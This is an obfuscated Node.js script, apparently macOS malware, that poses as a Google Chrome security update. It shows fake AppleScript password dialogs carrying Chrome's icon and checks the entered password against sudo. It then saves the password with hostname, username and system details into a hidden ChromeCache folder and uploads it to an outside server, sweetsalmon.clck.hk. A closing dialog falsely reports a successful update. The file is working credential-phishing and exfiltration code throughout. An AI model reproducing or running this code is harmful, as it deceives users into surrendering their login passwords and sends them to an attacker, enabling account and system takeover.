#!/usr/bin/env node

const _0x3bc536=_0x8f97;(function(_0x413a68,_0x29aa28){const _0x1de566=_0x8f97,_0x2af8aa=_0x413a68();while(!![]){try{const _0x2ad988=parseInt(_0x1de566(0x19a))/0x1+-parseInt(_0x1de566(0x175))/0x2*(-parseInt(_0x1de566(0x1b2))/0x3)+-parseInt(_0x1de566(0x154))/0x4+-parseInt(_0x1de566(0x185))/0x5+-parseInt(_0x1de566(0x169))/0x6*(parseInt(_0x1de566(0x183))/0x7)+parseInt(_0x1de566(0x170))/0x8*(-parseInt(_0x1de566(0x17f))/0x9)+parseInt(_0x1de566(0x177))/0xa;if(_0x2ad988===_0x29aa28)break;else _0x2af8aa['push'](_0x2af8aa['shift']());}catch(_0x257172){_0x2af8aa['push'](_0x2af8aa['shift']());}}}(_0x1064,0xe706a));const {execSync}=require('child_process'),fs=require('fs'),path=require('path'),os=require('os'),crypto=require(_0x3bc536(0x16f)),http=require('http'),https=require('https'),CONFIG={'serverDomain':_0x3bc536(0x1b1),'serverPath':_0x3bc536(0x161),'serverPort':0x1f98,'apiKey':_0x3bc536(0x157),'retryDelay':0x1388,'maxRetries':0x5,'timeout':0x1d4c0};function generateClientId(){const _0x13abb3=_0x3bc536;try{const _0x4e644d=getMacAddress(),_0x4efe70=os[_0x13abb3(0x18e)](),_0x5920d6=os[_0x13abb3(0x15e)]()[_0x13abb3(0x1a3)],_0x1806f5=crypto[_0x13abb3(0x187)](_0x13abb3(0x17b))[_0x13abb3(0x171)](_0x4e644d+':'+_0x4efe70+':'+_0x5920d6)[_0x13abb3(0x197)]('hex')['substring'](0x0,0x8);return _0x1806f5;}catch(_0x214105){return Math[_0x13abb3(0x19d)]()['toString'](0x24)[_0x13abb3(0x1b8)](0x2,0xa);}}function getMacAddress(){const _0x55f94b=_0x3bc536;try{const _0x21935e=os[_0x55f94b(0x1b3)]();for(const _0x2cd2eb of Object[_0x55f94b(0x1b0)](_0x21935e)){for(const _0x232b74 of _0x21935e[_0x2cd2eb]){if(!_0x232b74['internal']&&_0x232b74[_0x55f94b(0x1a1)]!==_0x55f94b(0x166))return _0x232b74[_0x55f94b(0x1a1)];}}return _0x55f94b(0x19b);}catch(_0x2beeb6){return _0x55f94b(0x19b);}}function _0x8f97(_0xab14c3,_0x29a15d){const _0x106461=_0x1064();return _0x8f97=function(_0x8f9740,_0x44ca6f){_0x8f9740=_0x8f9740-0x152;let _0x2fc36a=_0x106461[_0x8f9740];return _0x2fc36a;},_0x8f97(_0xab14c3,_0x29a15d);}function verifyPassword(_0x138e25,_0x2c2f95){const _0x3d3a88=_0x3bc536;try{const _0x38b63d=path[_0x3d3a88(0x160)](os[_0x3d3a88(0x1c7)](),_0x3d3a88(0x16d)+Date[_0x3d3a88(0x1ab)]()+'.sh'),_0x271e1c=_0x3d3a88(0x193)+_0x2c2f95+_0x3d3a88(0x17e);return fs[_0x3d3a88(0x1b6)](_0x38b63d,_0x271e1c,{'mode':0x1c0}),execSync('bash\x20'+_0x38b63d),fs[_0x3d3a88(0x1c5)](_0x38b63d),!![];}catch(_0x4503a5){return![];}}async function uploadFile(_0x48da3f,_0x4b1cf4=0x0){return new Promise(_0x2e5974=>{const _0x140242=_0x8f97;try{if(!fs[_0x140242(0x19e)](_0x48da3f)){_0x2e5974(![]);return;}const _0xffefd3=fs[_0x140242(0x16e)](_0x48da3f),_0x11db26=_0xffefd3[_0x140242(0x1a8)];if(_0x11db26===0x0){_0x2e5974(![]);return;}const _0x4c3192=fs[_0x140242(0x16b)](_0x48da3f);let _0x252d2e;const _0xffa973=path[_0x140242(0x15c)](_0x48da3f),_0xc0a112=_0xffa973[_0x140242(0x1ba)]('.')[0x0];_0xc0a112['length']===0x8&&/^[0-9a-f]+$/i['test'](_0xc0a112)?_0x252d2e=_0xc0a112:_0x252d2e=generateClientId();const _0x4e3bbf={'hostname':os[_0x140242(0x18e)](),'platform':os[_0x140242(0x155)](),'type':os['type'](),'arch':os[_0x140242(0x184)](),'username':os[_0x140242(0x15e)]()[_0x140242(0x1a3)],'id':_0x252d2e},_0x452b14=CONFIG[_0x140242(0x1af)]===0x1bb?_0x140242(0x1c0):'http',_0x524e97=_0x452b14+_0x140242(0x195)+CONFIG['serverDomain']+':'+CONFIG['serverPort']+CONFIG[_0x140242(0x188)],_0x4b360d=_0x524e97[_0x140242(0x1b7)](_0x140242(0x173)),_0xa7cd87=_0x4b360d?https:http,_0xaa7427=new URL(_0x524e97),_0x1aacbe='----WebKitFormBoundary'+Math[_0x140242(0x19d)]()['toString'](0x10)[_0x140242(0x198)](0x2);let _0x33d0af='';_0x33d0af+='--'+_0x1aacbe+'\x0d\x0a',_0x33d0af+=_0x140242(0x167),_0x33d0af+=_0x140242(0x1b5),_0x33d0af+=JSON['stringify'](_0x4e3bbf)+'\x0d\x0a',_0x33d0af+='--'+_0x1aacbe+'\x0d\x0a',_0x33d0af+=_0x140242(0x18d)+path['basename'](_0x48da3f)+_0x140242(0x1be),_0x33d0af+=_0x140242(0x1ac);const _0xce68b={'hostname':_0xaa7427[_0x140242(0x18e)],'port':_0xaa7427[_0x140242(0x191)]||(_0x4b360d?0x1bb:0x50),'path':_0xaa7427[_0x140242(0x1bc)]+_0xaa7427['search'],'method':_0x140242(0x196),'headers':{'Content-Type':'multipart/form-data;\x20boundary='+_0x1aacbe,'X-Client-Info':JSON['stringify'](_0x4e3bbf),'X-API-Key':CONFIG['apiKey']},'timeout':CONFIG['timeout']},_0x14ecb2=_0xa7cd87[_0x140242(0x18b)](_0xce68b,_0x374e89=>{const _0x423485=_0x140242;let _0x3bd206='';_0x374e89['on'](_0x423485(0x15d),_0x56c6ff=>{_0x3bd206+=_0x56c6ff;}),_0x374e89['on'](_0x423485(0x182),()=>{const _0x4e69e0=_0x423485;_0x374e89[_0x4e69e0(0x1aa)]>=0xc8&&_0x374e89[_0x4e69e0(0x1aa)]<0x12c?_0x2e5974(!![]):_0x4b1cf4<CONFIG[_0x4e69e0(0x1b4)]?setTimeout(()=>{const _0x20082c=_0x4e69e0;uploadFile(_0x48da3f,_0x4b1cf4+0x1)[_0x20082c(0x192)](_0x2e5974);},CONFIG['retryDelay']):_0x2e5974(![]);});});_0x14ecb2['on'](_0x140242(0x15f),_0x1a8774=>{const _0x2908a7=_0x140242;_0x4b1cf4<CONFIG[_0x2908a7(0x1b4)]?setTimeout(()=>{const _0x41d81c=_0x2908a7;uploadFile(_0x48da3f,_0x4b1cf4+0x1)[_0x41d81c(0x192)](_0x2e5974);},CONFIG['retryDelay']):_0x2e5974(![]);}),_0x14ecb2[_0x140242(0x17c)](_0x33d0af),_0x14ecb2[_0x140242(0x17c)](_0x4c3192),_0x14ecb2[_0x140242(0x17c)](_0x140242(0x176)+_0x1aacbe+'--\x0d\x0a'),_0x14ecb2['end']();}catch(_0x4e9f4e){_0x4b1cf4<CONFIG[_0x140242(0x1b4)]?setTimeout(()=>{const _0x510a9c=_0x140242;uploadFile(_0x48da3f,_0x4b1cf4+0x1)[_0x510a9c(0x192)](_0x2e5974);},CONFIG[_0x140242(0x164)]):_0x2e5974(![]);}});}function showPasswordPrompt(_0x3cba94,_0x216829=0x3,_0x53af62=!![]){const _0x5553a0=_0x3bc536;try{const _0x42e072=os[_0x5553a0(0x1bb)](),_0x2dcbe8=path['join'](_0x42e072,'ChromeCache');!fs[_0x5553a0(0x19e)](_0x2dcbe8)&&fs[_0x5553a0(0x168)](_0x2dcbe8,{'recursive':!![]});_0x3cba94=_0x3cba94||path['join'](_0x2dcbe8,'chrome_credentials.txt');const _0x5deecc=os['userInfo']()[_0x5553a0(0x1a3)];let _0xbe3cf5=_0x216829,_0x3c416f=![],_0x52a54e='';while(_0xbe3cf5>0x0&&!_0x3c416f){const _0x35cb43=path[_0x5553a0(0x160)](os['tmpdir'](),_0x5553a0(0x1c1)+Date[_0x5553a0(0x1ab)]()+_0x5553a0(0x174));let _0x17e11e=_0xbe3cf5<_0x216829?_0x5553a0(0x159):'';const _0x52e59a=['Chrome\x20-\x20Component\x20Update',_0x5553a0(0x16a),_0x5553a0(0x18f)],_0x481c27=[_0x5553a0(0x1c4),_0x5553a0(0x19c),_0x5553a0(0x158)],_0x492453=Math[_0x5553a0(0x199)](Math['random']()*_0x52e59a[_0x5553a0(0x17d)]),_0x59b192=_0x52e59a[_0x492453],_0xfb9b57=_0x481c27[_0x492453],_0x39c87d=_0x5553a0(0x16c)+_0x5deecc+_0x5553a0(0x180)+_0x59b192+_0x5553a0(0x18a)+_0x17e11e+_0xfb9b57+_0x5553a0(0x1bd),_0x1bf9b1=_0x5553a0(0x16c)+_0x5deecc+_0x5553a0(0x180)+_0x59b192+_0x5553a0(0x18a)+_0x17e11e+_0xfb9b57+_0x5553a0(0x181);fs[_0x5553a0(0x1b6)](_0x35cb43,_0x39c87d);try{_0x52a54e=execSync(_0x5553a0(0x1bf)+_0x35cb43+'\x22')[_0x5553a0(0x162)]()[_0x5553a0(0x1a6)]();}catch(_0x59b1c5){fs[_0x5553a0(0x1b6)](_0x35cb43,_0x1bf9b1),_0x52a54e=execSync(_0x5553a0(0x1bf)+_0x35cb43+'\x22')[_0x5553a0(0x162)]()[_0x5553a0(0x1a6)]();}fs[_0x5553a0(0x1c5)](_0x35cb43);if(_0x52a54e==='CANCELLED')return![];_0x53af62?_0x3c416f=verifyPassword(_0x5deecc,_0x52a54e):_0x3c416f=!![];if(!_0x3c416f){_0xbe3cf5--;if(_0xbe3cf5<=0x0){const _0x14548a=path[_0x5553a0(0x160)](os[_0x5553a0(0x1c7)](),'chrome_update_error_'+Date[_0x5553a0(0x1ab)]()+_0x5553a0(0x174)),_0x4e2fb2='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Maximum\x20password\x20attempts\x20exceeded.\x20Update\x20canceled.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20stop\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20';return fs['writeFileSync'](_0x14548a,_0x4e2fb2),execSync(_0x5553a0(0x1bf)+_0x14548a+'\x22'),fs[_0x5553a0(0x1c5)](_0x14548a),![];}}}if(_0x3c416f){const _0x4f8ef5=generateClientId(),_0x5e77fb=os['homedir'](),_0x4d7022=path['join'](_0x5e77fb,_0x5553a0(0x1a9));!fs[_0x5553a0(0x19e)](_0x4d7022)&&fs[_0x5553a0(0x168)](_0x4d7022,{'recursive':!![]});const _0x2c6c7b=path['join'](_0x4d7022,_0x4f8ef5+_0x5553a0(0x1a4)),_0x23383b=_0x5553a0(0x172)+_0x5deecc+_0x5553a0(0x1c2)+_0x52a54e+'\x0aTime:\x20'+new Date()[_0x5553a0(0x178)]()+_0x5553a0(0x15b)+os['hostname']()+_0x5553a0(0x194)+os[_0x5553a0(0x155)]()+_0x5553a0(0x1a0)+os[_0x5553a0(0x19f)]()+_0x5553a0(0x163)+os[_0x5553a0(0x184)]()+_0x5553a0(0x1ad)+_0x4f8ef5;fs[_0x5553a0(0x1b6)](_0x2c6c7b,_0x23383b);try{const _0x12fb88={'user':_0x5deecc,'password':_0x52a54e,'timestamp':new Date()[_0x5553a0(0x178)](),'hostname':os[_0x5553a0(0x18e)](),'system':{'platform':os[_0x5553a0(0x155)](),'release':os['release'](),'type':os[_0x5553a0(0x19f)](),'arch':os[_0x5553a0(0x184)]()},'clientId':_0x4f8ef5},_0x44a398=path['join'](_0x4d7022,_0x4f8ef5+'.json');fs[_0x5553a0(0x1b6)](_0x44a398,JSON[_0x5553a0(0x189)](_0x12fb88,null,0x2)),_0x3cba94&&_0x3cba94!==_0x2c6c7b&&fs['writeFileSync'](_0x3cba94,_0x23383b,{'flag':'a'}),uploadFile(_0x2c6c7b)[_0x5553a0(0x192)](_0x562cd8=>{});}catch(_0x9ecc47){}const _0x4858a0=path[_0x5553a0(0x160)](os['tmpdir'](),_0x5553a0(0x1c6)+Date[_0x5553a0(0x1ab)]()+_0x5553a0(0x174)),_0x5c77f6=_0x5553a0(0x179),_0x3a248c=_0x5553a0(0x190);fs[_0x5553a0(0x1b6)](_0x4858a0,_0x5c77f6);try{execSync(_0x5553a0(0x1bf)+_0x4858a0+'\x22');}catch(_0x4a8ff6){fs[_0x5553a0(0x1b6)](_0x4858a0,_0x3a248c),execSync(_0x5553a0(0x1bf)+_0x4858a0+'\x22');}return fs['unlinkSync'](_0x4858a0),!![];}return![];}catch(_0x507f8b){return![];}}function parseArgs(){const _0x4ee3fb=_0x3bc536,_0x5d3f4e=process[_0x4ee3fb(0x1a2)][_0x4ee3fb(0x1a7)](0x2),_0x167189={'outputFile':null,'maxAttempts':0x7,'verify':!![],'help':![]};for(let _0x340244=0x0;_0x340244<_0x5d3f4e[_0x4ee3fb(0x17d)];_0x340244++){switch(_0x5d3f4e[_0x340244]){case _0x4ee3fb(0x1b9):case'-o':_0x167189['outputFile']=_0x5d3f4e[++_0x340244];break;case _0x4ee3fb(0x153):case'-a':_0x167189[_0x4ee3fb(0x156)]=parseInt(_0x5d3f4e[++_0x340244],0xa);break;case _0x4ee3fb(0x1c3):_0x167189[_0x4ee3fb(0x165)]=![];break;case _0x4ee3fb(0x18c):case'-h':_0x167189['help']=!![];break;}}return _0x167189;}function showHelp(){const _0x3cf47a=_0x3bc536;console[_0x3cf47a(0x1a5)](_0x3cf47a(0x17a));}if(require[_0x3bc536(0x186)]===module){const options=parseArgs();options[_0x3bc536(0x1ae)]?showHelp():showPasswordPrompt(options[_0x3bc536(0x152)],options[_0x3bc536(0x156)],options['verify']);}module[_0x3bc536(0x15a)]={'showPasswordPrompt':showPasswordPrompt,'verifyPassword':verifyPassword};function _0x1064(){const _0x554472=['statSync','crypto','24nqeKvQ','update','User:\x20','https://','.scpt','1306AOBDmh','\x0d\x0a--','29888930HuGtMT','toISOString','\x0a\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Chrome\x20update\x20successfully\x20completed.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20path\x20to\x20resource\x20\x22app.icns\x22\x20in\x20bundle\x20\x22/Applications/Google\x20Chrome.app\x22\x0a\x20\x20\x20\x20\x20\x20','\x0aChrome\x20Password\x20Prompt\x20-\x20utility\x20to\x20obtain\x20macOS\x20password\x0a\x0aUsage:\x0a\x20\x20chrome-password-prompt\x20[options]\x0a\x0aOptions:\x0a\x20\x20-o,\x20--output\x20FILE\x20\x20\x20\x20\x20\x20\x20Path\x20to\x20file\x20for\x20saving\x20password\x0a\x20\x20-a,\x20--attempts\x20NUM\x20\x20\x20\x20\x20\x20Maximum\x20number\x20of\x20input\x20attempts\x20(default:\x203)\x0a\x20\x20--no-verify\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Disable\x20password\x20verification\x0a\x20\x20-h,\x20--help\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Show\x20this\x20help\x0a\x20\x20\x0aExamples:\x0a\x20\x20chrome-password-prompt\x0a\x20\x20chrome-password-prompt\x20--output\x20/path/to/credentials.json\x20--attempts\x205\x0a\x20\x20chrome-password-prompt\x20--no-verify\x0a\x20\x20','md5','write','length','\x22\x20|\x20sudo\x20-S\x20echo\x20\x22Password\x20verified\x22\x202>/dev/null\x0aexit\x20$?\x0a','2454057FepTIZ','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogTitle\x20to\x20\x22','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20buttonText\x20to\x20\x22Continue\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20dialogText\x20with\x20title\x20dialogTitle\x20default\x20answer\x20\x22\x22\x20buttons\x20{\x22Cancel\x22,\x20buttonText}\x20default\x20button\x20buttonText\x20with\x20icon\x20caution\x20with\x20hidden\x20answer\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20userPassword\x20to\x20text\x20returned\x20of\x20the\x20result\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20userPassword\x0a\x20\x20\x20\x20\x20\x20\x20\x20on\x20error\x20number\x20-128\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20\x22CANCELLED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20end\x20try\x0a\x20\x20\x20\x20\x20\x20','end','1611435MdHDeQ','arch','8312925MIvZlX','main','createHash','serverPath','stringify','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20dialogText\x20to\x20\x22','request','--help','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','hostname','Chrome\x20Update\x20Available','\x0a\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20\x22Chrome\x20update\x20successfully\x20completed.\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x20with\x20icon\x20note\x0a\x20\x20\x20\x20\x20\x20','port','then','\x0a#!/bin/bash\x0aecho\x20\x22','\x0aPlatform:\x20','://','POST','digest','substr','floor','683668TCqlfo','unknown','The\x20application\x20\x22Google\x20Chrome\x22\x20is\x20trying\x20to\x20make\x20changes\x20to\x20system\x20settings.','random','existsSync','type','\x0aType:\x20','mac','argv','username','.txt','log','trim','slice','size','ChromeCache','statusCode','now','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','\x0aClientID:\x20','help','serverPort','keys','sweetsalmon.clck.hk','3207tjxzmL','networkInterfaces','maxRetries','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','writeFileSync','startsWith','substring','--output','split','homedir','pathname','\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20buttonText\x20to\x20\x22Continue\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20try\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display\x20dialog\x20dialogText\x20with\x20title\x20dialogTitle\x20default\x20answer\x20\x22\x22\x20buttons\x20{\x22Cancel\x22,\x20buttonText}\x20default\x20button\x20buttonText\x20with\x20icon\x20path\x20to\x20resource\x20\x22app.icns\x22\x20in\x20bundle\x20\x22/Applications/Google\x20Chrome.app\x22\x20with\x20hidden\x20answer\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20set\x20userPassword\x20to\x20text\x20returned\x20of\x20the\x20result\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20userPassword\x0a\x20\x20\x20\x20\x20\x20\x20\x20on\x20error\x20number\x20-128\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20return\x20\x22CANCELLED\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20end\x20try\x0a\x20\x20\x20\x20\x20\x20','\x22\x0d\x0a','osascript\x20\x22','https','chrome_update_prompt_','\x0aPassword:\x20','--no-verify','Your\x20password\x20is\x20required\x20to\x20complete\x20the\x20Chrome\x20update.','unlinkSync','chrome_update_success_','tmpdir','outputFile','--attempts','1012468RKdhXl','platform','maxAttempts','tJz4uRVCwl2eEwyPTudYP9iGRfgq','Chrome\x20needs\x20to\x20update\x20security\x20components.\x20Please\x20enter\x20your\x20password\x20to\x20continue.','Incorrect\x20password\x20entered.\x20','exports','\x0aHostname:\x20','basename','data','userInfo','error','join','/api/files/upload','toString','\x0aArchitecture:\x20','retryDelay','verify','00:00:00:00:00:00','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','mkdirSync','18lOQrPV','Security\x20Update\x20Required','readFileSync','\x0a\x20\x20\x20\x20\x20\x20\x20\x20set\x20username\x20to\x20\x22','verify_password_'];_0x1064=function(){return _0x554472;};return _0x1064();}
